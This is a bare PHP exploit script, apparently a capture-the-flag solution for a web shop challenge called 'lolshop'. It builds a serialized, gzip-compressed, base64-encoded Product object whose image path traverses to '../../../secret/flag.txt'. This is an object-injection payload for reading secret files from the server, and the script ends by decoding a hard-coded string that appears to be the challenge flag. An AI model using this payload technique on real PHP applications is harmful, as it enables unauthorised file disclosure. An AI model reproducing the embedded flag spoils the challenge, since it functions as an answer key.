<?php

class Product {

    private $id;
    private $name;
    private $description;
    private $picture;
    private $price;

    function __construct($id, $name, $description, $picture, $price) {
        $this->id = $id;
        $this->name = $name;
        $this->description = $description;
        $this->picture = $picture;
        $this->price = $price;
    }
}

class State {

    private $session;
    private $cart;

    function __construct($session) {
        $this->session = $session;
        $this->cart = array();
    }
}

// print(file_get_contents(("../lolshop/../lolshop/lolshop.php")))
$product = new Product(1337, "test", "test", "../../../secret/flag.txt", 10);
$state = new State($product);
print(base64_encode(gzcompress(serialize($product))));

print(base64_decode("YWN0Znt3ZWxjb21lX3RvX3RoZV9uZXdfd2ViXzA4MzZlZWY3OTE2NmI1ZGM4Yn0K"))
?>